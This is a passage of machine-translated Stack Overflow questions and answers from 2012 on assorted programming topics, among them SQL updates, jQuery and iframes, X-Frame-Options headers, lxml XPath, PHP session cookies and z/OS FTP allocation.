不幸的是，IBM 的 FTP 服务器不支持更新的记录数空间分配规范（JCL 参数 AVGREC=U/M/K 加上作为 SPACE 参数中第一个规范的记录长度）。

但是，还有另一种选择，那就是使用较少使用的 SPACE 参数之一 - 块大小规范。为简单起见，我将假设 3390 种磁盘类型和标准数据集。

对于固定长度的记录，您想要计算适合半个轨道（27994 字节）的最大数字，因为 z/OS 仅支持最大 32760 的块大小。由于您正在处理 80 字节的记录，因此该数字是27290\. 将文件大小除以该数字，即可得出块数。然后在 SITE 服务器命令中，指定

```
SITE BLKSIZE=27920 LRECL=80 RECFM=FB BLOCKS=27920 PRI=calculated# SEC=a_little_extra 
```

这相当于 SPACE=(27920,(calculated#,a_little_extra))。

z/OS 空间分配计算所需的磁道数并向上舍入到最近的磁道边界。

对于可变长度记录，如果您的阅读应用程序可以处理它，请始终使用 BLKSIZE=27994。我对阅读应用程序发出警告的原因是，即使在今天，来自 ISV 的应用程序仍然具有奇怪的硬编码最大可变长度块，例如 12K。

如果您正在处理 PDSE，请始终在规范中对可变长度使用 BLKSIZE=32760，对固定长度使用最接近的 32760（FB/80 为 32720），但根据 BLKSIZE=4096 计算要求。PDSE 的底层布局很奇怪。物理记录是 4096 字节，这是因为有一些线性数据集 VSAM 代码处理物理 I/O。

# sql - 需要编写 SQL 语句将值从一个字段复制到另一个条件为真的字段

> ID：10658407
> 
> 赞同：0
> 
> 时间：2012-05-18T19:06:57.577
> 
> 标签：sql, tsql

我不是 SQL 专家（无论如何）。我知道我可以在 vb.net 中以编程方式执行此操作（如果我无法弄清楚如何使用 SQL 语句执行此操作）。

我需要将一个表中的一个字段的值复制到另一个表中的另一个字段，其中特定条件为真。我已经尽力在下面建模：

*   表1.field1
*   表1.字段2
*   表2.field1
*   表2.字段2

我想复制值

```
from :Table2.field2 
To   :Table1.field2

where Table1.field1 = Table2.field1 (There are about 3000 rows). 
```

基本上，对于一大堆记录，我在一个字段中有一些字符串信息，我需要将其复制到相同的记录中，但在不同表的不同字段中。那有意义吗？

我知道我应该提供一些代码来表明我正在尝试；但是，我真的不知道从哪里开始。如果有人能指出我正确的方向，我愿意自己坚持下去吗？我将不胜感激任何帮助/指导。

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-18T19:11:27.113

使用 SQL Server，您可以[`UPDATE`](http://msdn.microsoft.com/en-us/library/ms177523.aspx)使用连接来创建表：

```
UPDATE t1
 SET t1.field2 = t2.field2
FROM table1 t1
JOIN table2 t2
  ON t1.field1 = t2.field1 
```

# java - 在 jdk1.6 上运行 jaxb1 代码

> ID：10658412
> 
> 赞同：1
> 
> 时间：2012-05-18T19:07:11.690
> 
> 标签：java, jaxb, jdk1.6

我有试图在 JDK1.6（u 31）上运行的旧 jaxb1 代码。它编译得很好。当我尝试运行时出现错误 -

> 构造 QTIResultsProcessingV12 时出错：输入不是格式正确的文档：未找到提供程序 com.sun.xml.bind.ContextFactory_1_0_1

所以我尝试谷歌，发现我必须放在`jaxb1_impl.jar`类路径中。我在 jdk lib 中没有找到这个 jar，所以我下载了 JAXB RI 2.1.10 并将其`jaxb1_impl.jar`放入类路径中。然而我得到了同样的错误。

目前不希望迁移 jaxb1->jaxb2，因为这是一个短期解决方案。

# javascript - Facebook JS SDK 未在 Safari Mobile 上加载（使用 iPad）

> ID：10658413
> 
> 赞同：2
> 
> 时间：2012-05-18T19:07:21.553
> 
> 标签：javascript, facebook, ipad, mobile-safari

我正在使用 JS SDK 开发 Facebook 应用程序。在 FF/Chrome/Safari 上一切正常，除了无法加载 SDK 的 iPad 上。

我尝试使用非常简单的代码（大部分代码直接来自 Facebook 的文档），如下所示：

```
<!doctype html>
<html>
<head>

</head>
<body>
    <div id="fb-root"></div>
    <script src="//connect.facebook.net/en_US/all.js"></script>
    <script>

        /* All Facebook functions should be included 
        in this function, or at least initiated from here */

        window.fbAsyncInit = function() {

            FB.init({appId: MYAPPID, 
  status     : true, // check login status
  cookie     : true, // enable cookies to allow the server to access the session
  xfbml      : true  // parse XFBML
});

            FB.login(function(response) {
                if (response.authResponse) {
                    console.log('Welcome!  Fetching your information.... ');
                    FB.api('/me', function(response) {
                        console.log('Good to see you, ' + response.name + '.');

                    });
                } else {
                    console.log('User cancelled login or did not fully authorize.');
                }
            });

        };

        (function() {
            var e = document.createElement('script'); e.async = true;
            e.src = document.location.protocol +
                '//connect.facebook.net/en_US/all.js';
            document.getElementById('fb-root').appendChild(e);
        }());

    </script>
</div> 
```

什么都没有出现。没有弹出窗口（它们没有被阻止），没有console.log，什么都没有。是我的代码有问题还是 Facebook SDK 今天发疯了？我在平台状态上没有看到任何相关内容。

# java - 改进解析文本文件的代码

> ID：10658419
> 
> 赞同：2
> 
> 时间：2012-05-18T19:07:39.377
> 
> 标签：java, file, parsing, file-io

文本文件（前三行易于阅读，后三行以 p 开头）

```
ThreadSize:2
ExistingRange:1-1000
NewRange:5000-10000
p:55 - AutoRefreshStoreCategories  Data:Previous    UserLogged:true    Attribute:1    Attribute:16      Attribute:2060  
p:25 - CrossPromoEditItemRule      Data:New         UserLogged:false     Attribute:1      Attribute:10107   Attribute:10108
p:20 - CrossPromoManageRules       Data:Previous    UserLogged:true      Attribute:1      Attribute:10107   Attribute:10108 
```

下面是我为解析上述文件而编写的代码，解析后我使用它的 Setter 设置相应的值。我只是想知道我是否可以通过使用 RegEx 等其他方式在解析和其他方面进一步改进此代码？我的主要目标是解析它并设置相应的值。任何反馈或建议将不胜感激。

```
private List<Command> commands;
private static int noOfThreads = 3;
private static int startRange = 1;
private static int endRange = 1000;
private static int newStartRange = 5000;
private static int newEndRange = 10000;
private BufferedReader br = null;
private String sCurrentLine = null;
private int distributeRange = 100;
private List<String> values = new ArrayList<String>();
private String commandName;
private static String data;
private static boolean userLogged;
private static List<Integer> attributeID =  new ArrayList<Integer>();

    try {
        // Initialize the system
        commands = new LinkedList<Command>();
        br = new BufferedReader(new FileReader("S:\\Testing\\Test1.txt"));

        while ((sCurrentLine = br.readLine()) != null) {
            if(sCurrentLine.contains("ThreadSize")) {
                noOfThreads = Integer.parseInt(sCurrentLine.split(":")[1]);
            } else if(sCurrentLine.contains("ExistingRange")) {
                startRange = Integer.parseInt(sCurrentLine.split(":")[1].split("-")[0]);
                endRange = Integer.parseInt(sCurrentLine.split(":")[1].split("-")[1]);
            } else if(sCurrentLine.contains("NewRange")) {
                newStartRange = Integer.parseInt(sCurrentLine.split(":")[1].split("-")[0]);
                newEndRange = Integer.parseInt(sCurrentLine.split(":")[1].split("-")[1]);
            } else {
                allLines.add(Arrays.asList(sCurrentLine.split("\\s+")));
                String key = sCurrentLine.split("-")[0].split(":")[1].trim();
                String value = sCurrentLine.split("-")[1].trim();
                values = Arrays.asList(sCurrentLine.split("-")[1].trim().split("\\s+"));
                for(String s : values) {
                    if(s.contains("Data:")) {
                        data = s.split(":")[1];
                    } else if(s.contains("UserLogged:")) {
                        userLogged = Boolean.parseBoolean(s.split(":")[1]);
                    } else if(s.contains("Attribute:")) {
                        attributeID.add(Integer.parseInt(s.split(":")[1]));
                    } else {
                        commandName = s;
                    }
                }

                Command command = new Command();
                command.setName(commandName); 
                command.setExecutionPercentage(Double.parseDouble(key));
                command.setAttributeID(attributeID);
                command.setDataCriteria(data);
                command.setUserLogging(userLogged);
                commands.add(command);

            }
        }
    } catch(Exception e) {
        System.out.println(e);
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T23:47:58.630

我认为你应该知道在使用 RegEx 时你到底在期待什么。[http://java.sun.com/developer/technicalArticles/releases/1.4regex/](http://java.sun.com/developer/technicalArticles/releases/1.4regex/)应该会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T19:11:24.103

您可以使用[Scanner](http://docs.oracle.com/javase/6/docs/api/java/util/Scanner.html)类。它有一些辅助方法来读取文本文件

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-18T19:20:02.563

要回答评论：

```
p:55 - AutoRefreshStoreCategories  Data:Previous    UserLogged:true    Attribute:1    Attribute:16      Attribute:2060 
```

用正则表达式解析上面（和 3 次`Attribute:`）：

```
String parseLine = "p:55 - AutoRefreshStoreCategories  Data:Previous    UserLogged:true    Attribute:1    Attribute:16      Attribute:2060";
    Matcher m = Pattern
            .compile(
                    "p:(\\d+)\\s-\\s(.*?)\\s+Data:(.*?)\\s+UserLogged:(.*?)\\s+Attribute:(\\d+)\\s+Attribute:(\\d+)\\s+Attribute:(\\d+)")
            .matcher(parseLine);
    if(m.find()) {
        int p = Integer.parseInt(m.group(1));
        String method = m.group(2);
        String data = m.group(3);
        boolean userLogged = Boolean.valueOf(m.group(4));
        int at1 = Integer.parseInt(m.group(5));
        int at2 = Integer.parseInt(m.group(6));
        int at3 = Integer.parseInt(m.group(7));
        System.out.println(p + " " + method + " " + data + " " + userLogged + " " + at1 + " " + at2 + " "
                + at3);
    } 
```

**编辑**查看您的评论，您仍然可以使用正则表达式：

```
String parseLine = "p:55 - AutoRefreshStoreCategories  Data:Previous    UserLogged:true    "
            + "Attribute:1    Attribute:16      Attribute:2060";
    Matcher m = Pattern.compile("p:(\\d+)\\s-\\s(.*?)\\s+Data:(.*?)\\s+UserLogged:(.*?)").matcher(
            parseLine);
    if(m.find()) {
        for(int i = 0; i < m.groupCount(); ++i) {
            System.out.println(m.group(i + 1));
        }
    }

    Matcher m2 = Pattern.compile("Attribute:(\\d+)").matcher(parseLine);
    while(m2.find()) {
        System.out.println("Attribute matched: " + m2.group(1));
    } 
```

但这取决于“真实”属性之前是否没有`Attribute:`名称（例如方法名称 - after `p`）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-23T06:13:19.623

我会把它翻过来。目前你是：

1.  扫描该行以查找关键字：如果找不到则整个行，这是通常的情况，因为您有许多关键字要处理，并且它们不会全部出现在每一行上。
2.  再次扫描整行以查找“：”并在所有出现时将其拆分
3.  主要将 ':' 之后的部分解析为整数，或偶尔解析为范围。

所以对每一行进行了几次完整的扫描。除非文件有数以万计的行，否则这本身不是问题，但它表明您已经将处理重新置于前面。

# jquery - 使用 Jquery 在 iF rame 中的下拉菜单上设置 .change 函数

> ID：10658420
> 
> 赞同：1
> 
> 时间：2012-05-18T19:07:41.477
> 
> 标签：jquery

谁能告诉我为什么这不起作用以及我需要做什么才能使它起作用？

```
$("#rptframe").contents()
              .find('#customerjax')
              .change(function () { alert("yeah"); })
              .change(); 
```

感谢任何可以提供帮助的人！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T20:58:54.417

这是一个有效的[JSFiddle](http://jsfiddle.net/CxuCd/)。您的问题基本上是您没有访问 iframe 中的元素。您必须使用`.contentWindow.document`iframe 元素来深入了解框架内容。

这应该可以工作：

```
$($("#rptframe")[0].contentWindow.document)
    .find('#customerjax')
    .change(function () { alert("yeah"); })
    .change(); 
```

# android - 初始化后选项卡的内容不会改变，最后按下的选项卡保持不变

> ID：10658421
> 
> 赞同：1
> 
> 时间：2012-05-18T19:07:42.603
> 
> 标签：android, tabs, android-listview, android-tabhost, android-tabactivity

我使用此代码创建 n 个选项卡：

```
TabHost tabs = (TabHost)findViewById(R.id.tabhost); 
     tabs.setup(mLocalActivityManager); 

     StateListDrawable[] drawables  = new StateListDrawable[hotel.categoryArray.length];

     for (int i = 0; i < hotel.categoryArray.length; i++){
         TabSpec spec1 = tabs.newTabSpec(hotel.categoryArray[i]);
         Intent intent = new Intent(this, ListViewActivity.class);
         Bundle b = new Bundle();
         b.putParcelableArrayList("Businesses", createArray(hotel.categoryArray[i], hotel.explore));
         intent.putExtras(b);
         spec1.setContent(intent); 
         TextView tab1 = new TextView(this);
         tab1.setText(hotel.categoryArray[i]);
         tab1.setGravity(android.view.Gravity.CENTER);
         tab1.setTextSize(14.0f);
         tab1.setTextColor(text);
         drawables[i] = new StateListDrawable();
         drawables[i].addState(selected, new ColorDrawable(selectedColor));
         drawables[i].addState(unselected, new ColorDrawable(defaultColor));
         tab1.setBackgroundDrawable(drawables[i]);
         spec1.setIndicator(tab1);
         tabs.addTab(spec1);
     }

     tabs.setCurrentTab(0); 
```

这是我的 ListViewActivity。它获取对象的 ArrayList 并使用我的自定义 MyCustomBaseAdapter 填充似乎工作正常的列表。

```
 @Override
     public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.list);

         Bundle bundle = this.getIntent().getExtras();
         ArrayList<Business> business = null;
         if(bundle!=null) {
             business = bundle.getParcelableArrayList("Businesses");
         }

         final ListView lv1 = getListView();
         lv1.setAdapter(new MyCustomBaseAdapter(this, business));

         lv1.setOnItemClickListener(new OnItemClickListener() {
          @Override
          public void onItemClick(AdapterView<?> a, View v, int position, long id) { 
           Object o = lv1.getItemAtPosition(position);
           Business fullObject = (Business)o;
           Toast.makeText(ListViewActivity.this, "You have chosen: " + " " + fullObject.name, Toast.LENGTH_LONG).show();
          }  
         });
 } 
```

问题是它填充选项卡并按下每个新选项卡填充字段就好了，但是当您返回上一个选项卡时它不会变回，内容仍然存在。它也以一种奇怪的方式进行操作，它不会从第二个选项卡转到第一个选项卡，它在第三个到第二个选项卡之间切换得很好，如果你转到第四个选项卡，那么它的内容会保留在所有选项卡中。

知道我应该在哪里寻找问题或替代解决方案以拥有一个填充列表并具有“临时”选项卡的类吗？

# box2d - 在 Box2D 中使用索引？

> ID：10658424
> 
> 赞同：1
> 
> 时间：2012-05-18T19:07:44.080
> 
> 标签：box2d

有没有办法通过用它们的索引定义顶点来用 Box2D 创建一个多边形？
由于我使用的是openGL，无论如何我都必须定义顶点和索引，我很惊讶Box2D中没有一种方法可以像我通常创建一个网格一样创建一个身体（形状）。我是否遗漏了什么，或者这通常以不同的方式完成？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-16T22:42:43.933

在 AS3 中，它可以使用 B2D 2.1a 版本来完成。

```
package org.pf.constructor.shapes
{
import Box2D.Collision.Shapes.b2PolygonShape;
import Box2D.Common.Math.b2Vec2;

/**
 * ...
 * @author zeksa'
 */
public class PFb2dConvexShape extends b2PolygonShape
{
    private var _vertices:Array = new Array();

    public function PFb2dConvexShape(vertices:Array)
    {
        for (var i:int = 0; i < vertices.length; i++)
        {
            _vertices.push(new b2Vec2(vertices[i][0] / 30, vertices[i][1] / 30));
        }
        SetAsArray(_vertices, _vertices.length);
    }

}

} 
```

我已经这样做了。认为你可以在 C++ 上做同样的事情。Box2D 仅支持凸形。如果你想要凹形，我认为[这篇文章](http://www.emanueleferonato.com/2011/09/12/create-non-convex-complex-shapes-with-box2d/)会对你有所帮助，仅限 AS3 =)。希望您能了解如何在 C++ 上执行此操作。玩得开心！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-17T06:53:57.643

你应该看看 poly2tri 库：[http ://code.google.com/p/poly2tri/](http://code.google.com/p/poly2tri/)

这是一个非常快速有效的库来执行约束 Delaunay 三角剖分（[http://en.m.wikipedia.org/wiki/Constrained_Delaunay_triangulation](http://en.m.wikipedia.org/wiki/Constrained_Delaunay_triangulation)）。它从您的输入顶点（最终是 Steiner 点，但您必须自己计算它们才能获得精炼的 Delaunay，或使用 C 版本的库）输出三角形映射，然后您可以使用它们构建您的固定装置.

这就是我在这里所做的：http: [//vimeo.com/m/33500649](http://vimeo.com/m/33500649)

请注意，该库不会接受自相交多边形、重复点或共线点。在计算三角测量之前，您必须检查这一点。

如果你习惯了 glib 库，我猜你应该尝试实现 C 版本，但我自己没有尝试过，所以我说不出来。我认为它甚至比 C++ 更快，并且它确实实现了精炼。可用于网格。

# firefox - X-Frame-Options：Firefox 和 chrome 中的 ALLOW-FROM

> ID：10658435
> 
> 赞同：81
> 
> 时间：2012-05-18T19:09:24.930
> 
> 标签：firefox, google-chrome, x-frame-options, clickjacking

根据这篇文章，我正在实施“传递”，`X-Frame-Options`让合作伙伴网站将我雇主的网站包装在 iframe 中：http: [//blogs.msdn.com/b/ieinternals/archive/2010/03/30 /combating-clickjacking-with-x-frame-options.aspx](http://blogs.msdn.com/b/ieinternals/archive/2010/03/30/combating-clickjacking-with-x-frame-options.aspx)

（拆分 URLS 发布）

简而言之，我们合作伙伴的页面有一个 iframe，其中包含针对我们域的 URL。对于我们域中的任何页面，他们都会添加一个特殊的 url 参数，例如`&@mykey=topleveldomain.com`，告诉我们页面的顶级域是什么。

我们的过滤器从 URL 中提取合作伙伴 TLD（如果提供），并根据白名单对其进行验证。如果它在列表中，我们会发送`X-Frame-Options`带有值的标题`ALLOW-FROM topleveldomain.com`（并添加一个 cookie 以供将来点击）。如果它不在我们的白名单上，我们会发货`SAMEORIGIN`或`DENY`.

`ALLOW-FROM domain`问题在于，对于最新的 Firefox 和 Google Chrome，它看起来像是以无操作的方式发送结果。至少，IE8 似乎正确地实现了`ALLOW-FROM`.

查看此页面： [http](http://www.enhanceie.com/test/clickjack) ://www.enhanceie.com/test/clickjack 。在“应该显示内容”的第 5 个（共 5 个）框之后，是一个不应该显示内容的框，但它是。在这种情况下，iframe 中的页面正在发送`X-Frame-Options: ALLOW-FROM http://www.debugtheweb.com`一个与`http://www.enhanceie.com`. 然而，框架仍然显示内容。

`X-Frame-Options`关于是否真正`ALLOW-FROM`跨相关（桌面）浏览器实现的任何见解？也许语法已经改变？

一些感兴趣的链接：

*   关于 x-frame-options 的 rfc 草案：[https ://datatracker.ietf.org/doc/html/draft-gondrom-frame-options-01](https://datatracker.ietf.org/doc/html/draft-gondrom-frame-options-01)
*   developer.mozilla 文章将标头讨论为 2-option 标头（sameorigin 或 deny）。 [https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options)
*   发起整个事情的 msdn 博客：http: [//blogs.msdn.com/b/ie/archive/2009/01/27/ie8-security-part-vii-clickjacking-defenses.aspx](http://blogs.msdn.com/b/ie/archive/2009/01/27/ie8-security-part-vii-clickjacking-defenses.aspx)
*   讨论 3 个值的 msdn 博客：添加 allow-from origin [http://blogs.msdn.com/b/ieinternals/archive/2010/03/30/combating-clickjacking-with-x-frame-options.aspx](http://blogs.msdn.com/b/ieinternals/archive/2010/03/30/combating-clickjacking-with-x-frame-options.aspx)

* * *

## 回答 #1

> 赞同：44
> 
> 时间：2013-02-15T11:39:55.383

Chrome 或 Safari 不支持 ALLOW-FROM。请参阅 MDN 文章：[https ://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options)

您已经在做一个自定义标头并使用正确的数据发送它，当您检测到它来自有效合作伙伴时，您是否可以不排除标头并将 DENY 添加到所有其他请求？当您已经动态构建逻辑时，我看不到 AllowFrom 的好处吗？

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2013-10-04T20:23:18.257

我发布了这个问题，但从未看到反馈（似乎是在几个月后出现的：）。

正如 Kinlan 所提到的，并非所有浏览器都支持 ALLOW-FROM 作为 X-Frame-Options 值。

解决方案是根据浏览器类型进行分支。对于 IE，发送[X-Frame-Options](https://developer.mozilla.org/en-US/docs/HTTP/X-Frame-Options)。对于其他所有人，发送[X-Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Security/CSP/Introducing_Content_Security_Policy)。

希望这会有所帮助，很抱歉花了这么长时间来关闭循环！

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2017-04-10T12:40:19.260

对于 Chrome，而不是

```
response.AppendHeader("X-Frame-Options", "ALLOW-FROM " + host); 
```

你需要添加`Content-Security-Policy`

```
string selfAuth = System.Web.HttpContext.Current.Request.Url.Authority;
string refAuth = System.Web.HttpContext.Current.Request.UrlReferrer.Authority;
response.AppendHeader("Content-Security-Policy", "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: *.msecnd.net vortex.data.microsoft.com " + selfAuth + " " + refAuth); 
```

到 HTTP 响应标头。
请注意，这假设您在服务器上检查了是否允许 refAuth。
另外，请注意，您需要进行浏览器检测以避免`allow-from`为 Chrome 添加标头（在控制台上输出错误）。

有关详细信息，请[在此处查看我的答案。](https://stackoverflow.com/questions/10205192/x-frame-options-allow-from-multiple-domains/43323121#43323121)

# python - 验证列内容时使用 lxml 语法解析表元素时出错

> ID：10658438
> 
> 赞同：1
> 
> 时间：2012-05-18T19:09:33.340
> 
> 标签：python, html, lxml

我有以下代码来解析 html 表。如何检查`<td>`元素中的指定文本？这不起作用：`val=doc.xpath('//tr/td[child::*[text()="Street :"]/span/text()')`。我试图`<span>`仅在`<td>`文本匹配“街道：”时提取文本。非常感谢任何反馈！

```
import lxml.html as lh

html='''<tr>
<td>
Street : <span> High St. </span>
</td>
</tr>
<tr>
<td>
City : <span> Hightstown </span>
</td>
</tr>'''

doc=lh.fromstring(html)

#val=doc.xpath('//tr/td[child::*[text()="Street :"]/span/text()')
#street=doc.xpath('//tr/td/text()')
val=doc.xpath('//tr/td/span/text()')

#print street
print val 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T19:19:43.623

```
>>> doc.xpath('//tr/td[contains(text(),"Street :")]/span/text()')
[' High St. '] 
```

# ruby-on-rails-3 - 在 Rails 中构建 html 字符串时比 ''.html_safe 更好的方法？

> ID：10658441
> 
> 赞同：1
> 
> 时间：2012-05-18T19:09:56.350
> 
> 标签：ruby-on-rails-3, html-safe

典型模式：

```
out = ''.html_safe # or ActiveSupport::SafeBuffer.new
out << content_tag(...) if foo
out << 'hello, 1 < 2' # will be escaped properly
out << content_tag(...) if bar

out 
```

这工作正常。有没有比这更好/更短/更好的方法，特别是调用`''.html_safe`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T19:19:47.693

我不会对此表示赞同，因为我认为这不是您正在寻找的答案。但我想无论如何我都会分享一些想法以供考虑。

这实际上可能更难阅读，但我有兴趣查看基准测试的结果与您的问题中使用的实现。

```
out = "#{content_tag(...) if foo}" <<
      "hello, 1 < 2" <<
      "#{content_tag(...) if bar}"
out.html_safe 
```

另外，我不熟悉如何`html_safe`知道初始设置与返回之前是否存在差异的内部结构。我猜初始设置`html_safe`会更快，因为您复制的是零长度字符串而不是可能很长的字符串，但为了论证：

```
out = '' # or ActiveSupport::SafeBuffer.new
out << content_tag(...) if foo
out << 'hello, 1 < 2' # will be escaped properly
out << content_tag(...) if bar
out.html_safe 
```

考虑到这一点，我会考虑从上面修改我的原始代码，甚至更进一步：

```
"#{content_tag(...) if foo}".html_safe <<
"hello, 1 < 2" <<
"#{content_tag(...) if bar}" 
```

再一次，不是很可读，但我想我会把它扔在那里作为思考的食物。

# python - Python 和 Google Checkout

> ID：10658443
> 
> 赞同：2
> 
> 时间：2012-05-18T19:10:22.867
> 
> 标签：python, login, google-checkout

我正在尝试使用 python 脚本登录并从我的 Google Checkout 帐户中获取 html。它似乎登录但返回一个奇怪的页面： ![在此处输入图像描述](../Images/d2348acb06b199d0c6efa6963bbcd3d4.png) 其中没有我试图解析的任何订单信息。我知道 Google Checkout 有一个 API，但没有办法只解析支付总额，这是我所关心的。

这是我的代码：

```
import urllib, urllib2, cookielib

username = 'username'
password = 'password'

cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
login_data = urllib.urlencode({'Email' : username, 'Passwd' : password})
opener.open('https://accounts.google.com/ServiceLogin?service=sierra&passive=1200&continue=https://checkout.google.com/sell/orders&followup=https://checkout.google.com/sell/orders&ltmpl=seller&scc=1&authuser=0', login_data)
resp = opener.open('https://checkout.google.com/sell/payouts')

f = file('test.html', 'w')
f.write(resp.read()) 
f.close()
print "Finished" 
```

**如何获取此代码以显示我的帐户的正确 HTML，以便我可以解析它？**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T19:41:25.483

这取决于 Google Checkout 可能使用哪种浏览器检测或 javascript 技巧。将您的用户代理设置为著名的桌面浏览器可能就足够了——从屏幕截图来看，Google Checkout 似乎假设您使用的是移动浏览器。

# objective-c - UIKit.h 未找到错误

> ID：10658453
> 
> 赞同：6
> 
> 时间：2012-05-18T19:11:19.947
> 
> 标签：objective-c, ipad, uikit

我为 ipad 制作了一个单视图应用程序，带有电影、webview 和按钮，当我尝试运行它时出现此错误。我已经重新启动了应用程序，并重新安装了它，但没有任何效果。我的 MoviePlayer_Prefix.pch 文件中不断出现此错误。有人可以帮我吗？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2020-10-29T08:23:03.127

由于找不到 UIKit.h +“无法为目标加载标准库...”，我遇到了同样的问题，无法编译项目

对我来说解决方案非常简单——退出（CMD+Q）并重新启动 Xcode。我发现打开 Xcode 后，macOS 似乎已经删除了 Xcode 的命令行工具，因为它正在准备更新并且重新启动 Xcode 触发了“安装附加组件”更新，它使问题消失了。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2020-11-03T09:44:33.913

就像 Faul Textor 所说的那样，您的 XCode 很可能已更新到 12.1，但您的命令行工具没有。您需要完全退出 XCode，然后重新启动它，您应该会看到一个弹出窗口说“安装附加组件”对不起，这应该是对他的回复的评论，但我不能这样做。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-05-18T19:21:19.337

听起来您在某个时候从项目中删除了 UIKit.framework。检查它是否列在您的项目导航器中。如果它不存在，请在项目导航窗格中转到您的项目，选择您的目标，转到构建阶段选项卡，单击链接二进制与库，点击加号按钮，在那里找到 UIKit.framework 并将其添加到您的项目.

编辑：这个[答案](https://stackoverflow.com/questions/4008800/ios-sdk-broken-ever-after-reinstall-uikit-and-foundation-frameworks-not-found)表明您的框架搜索路径构建设置可能存在问题。检查一下，如果路径是空的并且它仍然不起作用，我认为重新安装 Xcode 会修复它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-05-28T22:48:48.803

只是想在不犯愚蠢的错误上加上我的两分钱-遇到了这个答案，希望能解决同样的问题。

原来我写`#import "<UIKit/UIKit.h>"`的不是`#import <UIKit/UIKit.h>`.

以为我会添加以防其他人像我一样犯一个简单的错误。

# android - Android - 创建一个仅包含所有图像文件夹名称的列表

> ID：10658455
> 
> 赞同：0
> 
> 时间：2012-05-18T19:11:26.910
> 
> 标签：android

我被困在一个点，我的活动生成一个列表，其中包含一个拇指图像和所有包含 SD 卡图像的文件夹的名称。 1\. 我如何只过滤那些带有图像的文件夹？2\. 我如何从文件夹中的第一张图片中获取缩略图？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-23T06:11:13.243

```
How do i filter only those folders with the images 
```

您可以检查文件夹中文件的扩展名，以查看它们是否属于图像类型。

```
How do i get the thumb images from the first image in the folder 
```

使用以下方法将文件压缩成更小的尺寸

```
public Bitmap compressBitmap(String filePath, int requiredSize)
{
    File file = new File(filePath);
    if (file.exists())
    {
        try
        {

            BitmapFactory.Options o = new BitmapFactory.Options();
            o.inJustDecodeBounds = true;
            BitmapFactory.decodeFile(filePath, o);

            // The new size we want to scale to
            final int REQUIRED_SIZE = requiredSize;

            // Find the correct scale value. It should be the power of 2.
            int width_tmp = o.outWidth, height_tmp = o.outHeight;
            int scale = 1;
            while (true)
            {
                if (width_tmp / 2 < REQUIRED_SIZE || height_tmp / 2 < REQUIRED_SIZE)
                {
                    break;
                }
                width_tmp /= 2;
                height_tmp /= 2;
                scale *= 2;
            }

            // Decode with inSampleSize
            BitmapFactory.Options o2 = new BitmapFactory.Options();
            o2.inSampleSize = scale;
            return BitmapFactory.decodeStream(new FileInputStream(file), null, o2);
        }

        catch (FileNotFoundException e)
        {
            e.printStackTrace();
        }

        return null;
    }

    return null;
} 
```

# php - PHP 会话是否在内部使用 cookie？什么是会话 cookie？

> ID：10658458
> 
> 赞同：0
> 
> 时间：2012-05-18T19:11:42.363
> 
> 标签：php, session, cookies

我还没有编写任何代码来设置或获取 cookie。我只使用 PHP 会话。

它是一个移动应用程序，可在 Windows CE 和 Windows 移动扫描仪上运行

如果我不接受 cookie 会话将不起作用。

它特别说接受会话cookie。当我接受它的工作。

那么这个 Session Cookie 是什么？任何人都有任何想法

我认为它专门用于移动扫描仪！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-18T19:12:37.720

是的，PHP 会话使用 cookie。如果您不接受 cookie，PHP 将无法跟踪您的请求属于哪个会话。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-18T19:37:34.800

是 PHP 会话使用 cookie

（您可以[通过 URL 传播会话 id，](http://www.php.net/manual/en/session.configuration.php#ini.session.use-trans-sid)但是众所周知，这是不安全的，并且会破坏 PHP 难以解析 URL 的任何地方（例如，在 javascript 中）。直到您真正了解会话在 HTTP 和 PHP 中的工作方式之前，我会强烈建议您坚持使用基于 cookie 的会话）

> 那么这个 Session Cookie 是什么

在这种情况下，它具有双重含义：首先，它包含一个引用存储在服务器上的一组数据的值——会话数据。其次，它们通常作为浏览器会话 cookie 实现 - 即，只要浏览器正在运行，它们就会在浏览器上持续存在，不再存在。

> 我认为它专门用于移动扫描仪！

不。

# c# - 将 Gtk# Textbuffer 内容保存到文件中

> ID：10658460
> 
> 赞同：2
> 
> 时间：2012-05-18T19:11:49.647
> 
> 标签：c#, mono, gtk#

Gtk# 是否提供了将格式化文本从 TextView / Textbuffer 写入文件的可能性？
最合理的文件格式是什么：XML、RTF、HTML？
如果没有可用的东西：
有没有一种简单的方法来逐步遍历 TextBuffer 的 TextIter 元素？我能想象的唯一方法是：

```
for (i=0; i<TextBuffer.CharCount; i++){
  iter=TextBuffer.GetIterAtOffset(i);
  writeIterAndTagToFile(iter);
} 
```

我希望有更好的方法
感谢
Harald的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-19T21:41:57.433

